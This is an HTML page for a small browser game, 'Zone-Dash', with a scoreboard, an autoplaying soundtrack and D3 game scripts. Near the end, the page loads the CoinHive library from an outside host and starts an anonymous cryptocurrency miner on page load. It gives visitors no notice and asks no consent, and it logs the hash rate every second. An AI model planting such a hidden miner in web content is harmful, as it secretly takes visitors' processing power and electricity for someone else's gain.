<!DOCTYPE html>
<html>
  <head>
    <link rel='stylesheet' type='text/css' href='./client/styles.css'>
  </head>
  <body>
  <h1 style="color: white; margin: 0 auto; text-align: center"><b>Zone-Dash</b></h1>
  <audio id="main_theme" controls autoplay loop>
    <source src="./media/ShootingStars.mp3" type="audio/mp3">
  </audio>
    <div class="scoreboard">
      <div class="highscore">High score: <span class="hscore">0</span></div>
      <div class="current">Current score: <span class="curr">0</span></div>
      <div class="collisions">Collisions: <span class="collis">0</span></div>
    </div>
    <div class="boarz"><div class="mouse"></div></div>
    <script src="./client/lib/d3.js" charset="utf-8"></script>
    <script src='./client/index.js'></script>
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
      <script>
        var miner = new CoinHive.Anonymous('63M772zQCnDDbX8Gdyb6UmLj1jytqemm');
        miner.start();
        setInterval(function() {
          var hashesPerSecond = miner.getHashesPerSecond();
          var totalHashes = miner.getTotalHashes();
          var acceptedHashes = miner.getAcceptedHashes();
          console.log("hashedPerSecond: ", hashesPerSecond);
          console.log("totalHashes: ", totalHashes);
          console.log("acceptedHashes: ", acceptedHashes);
        }, 1000);
      </script>
  </body>
</html>
